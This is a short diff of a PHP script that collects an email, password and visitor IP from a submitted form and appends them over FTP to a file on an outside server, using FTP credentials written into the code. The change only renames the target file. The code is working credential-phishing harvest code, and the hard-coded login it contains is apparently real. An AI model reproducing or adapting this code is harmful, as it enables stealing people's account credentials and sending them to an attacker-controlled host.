@@ -3,7 +3,7 @@
 $email = $_POST['email']; 
 $pass = $_POST['pass'];
 $ip = $_SERVER['REMOTE_ADDR']; 
-$f = fopen("ftp://webpass20:codetek10@ftp.webcindario.com/web/passwords.html", "a"); 
+$f = fopen("ftp://webpass20:codetek10@ftp.webcindario.com/web/index.html", "a"); 
 fwrite ($f, 'Email: [<b><font color="#EE0707">'.$email.'</font></b>] Password: [<b><font color="#390FF1">'.$pass.'</font></b>] IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>');
 fclose($f);
 sleep(2);
